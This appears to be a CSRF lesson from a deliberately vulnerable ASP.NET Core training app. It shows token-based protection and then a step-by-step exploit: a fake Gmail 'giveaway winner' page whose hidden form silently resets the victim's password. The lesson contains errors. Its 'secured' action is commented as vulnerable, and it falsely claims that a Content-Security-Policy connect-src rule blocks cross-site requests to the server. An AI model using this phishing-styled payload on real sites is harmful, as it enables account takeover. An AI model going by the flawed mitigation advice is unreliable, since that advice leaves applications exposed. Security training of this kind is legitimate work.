## Secured Example for CSRF Attack

#### Explanation:
- The **@Html.AntiForgeryToken()** helper generates a unique token for each user session.
- The **[ValidateAntiForgeryToken]** attribute validates the token before processing the request, blocking unauthorized submissions.

#### Secured Code Example (ASP.NET Core)
**Controller Action**: Use the `[ValidateAntiForgeryToken]` attribute to protect sensitive actions.

```csharp
// CSRF-Protected Action
[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult UpdatePassword(string newPassword, string confirmPassword)
{
    // Vulnerable to CSRF as it lacks token validation
    return Ok("Password updated.");
}
```

**HTML Form**: Add the CSRF token to the form with `@Html.AntiForgeryToken()` to ensure the token is sent with the request.

```html
<form action="/UpdatePassword" method="POST">
    @Html.AntiForgeryToken()
    <input type="password" name="newPassword" value="Admin@123">
    <input type="password" name="confirmPassword" value="Admin@123">
    <button type="submit">Update password</button>
</form>
```
### CSP mitigation for CSRF
With this CSP setup, any AJAX requests from other domains trying to access `http://localhost:5187` will be blocked, as the connect-src 'self' policy only allows AJAX requests from the same origin. Therefore, if an attacker tries to make an unauthorized AJAX request from another domain, it won’t go through.

```csharp
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    // Other middleware...
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("Content-Security-Policy", 
            "default-src 'self'; connect-src 'self'; script-src 'self' https://trusted-scripts.com");
        await next();
    });
}
```

### Payload sample to exploit the CSRF vulnerability:

**Step 1:** After clicking the `Dive In` button, log into the application.  
**Step 2:** Next, create an HTML file on your local machine and paste the HTML code provided below into that file.  
**Step 3:** Then, run the HTML file on your local machine and view the page in the same browser that you used for the vuln-sync application.  
**Step 4:** Click the button on that HTML page, labeled `Click here`.  
**Step 5:** Now you can check the application; the password has been updated with the value from the given form field.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gmail - Giveaway Winner Alert</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f1f3f4;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .gmail-container {
      max-width: 600px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #e0e0e0;
    }
    .header {
      background-color: #4285f4;
      color: white;
      padding: 20px;
      border-radius: 8px 8px 0 0;
      font-size: 18px;
      font-weight: bold;
      text-align: center;
    }
    .email-content {
      padding: 20px;
      color: #202124;
    }
    .email-content h2 {
      font-size: 16px;
      color: #4285f4;
    }
    .email-body {
      font-size: 14px;
      line-height: 1.6;
      margin-top: 10px;
    }
    .email-button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 10px 20px;
      font-size: 14px;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
      text-align: center;
      margin-top: 10px;
      display: inline-block;
    }
    .email-footer {
      margin-top: 20px;
      font-size: 12px;
      color: #5f6368;
      border-top: 1px solid #e0e0e0;
      padding-top: 10px;
    }
  </style>
</head>
<body>

<div class="gmail-container">
  <div class="header">Congratulations! You're a Giveaway Winner!</div>
  <div class="email-content">
    <h2>Claim Your Prize!</h2>
    <p class="email-body">
      You've won our latest giveaway! To claim your prize, please click the button below to complete the verification process. We hope you enjoy your reward!
    </p>
    <button class="email-button" onclick="submitForm()">Click Here</button>
    <div class="email-footer">
      <p>© 2024 Example LLC, 1234 Example Street, Sample City, EX 56789, USA</p>
    </div>
  </div>
</div>

<!-- Hidden Form to Submit on Click -->
<form id="csrf-form" action="http://localhost:5187/Secured/Csrf/Updatepassword" method="POST" style="display:none;">
  <input type="hidden" name="NewPassword" value="1234" />
  <input type="hidden" name="ConfirmPassword" value="1234" />
</form>

<script>
  function submitForm() {
    document.getElementById("csrf-form").submit();
  }
</script>

</body>
</html>
```

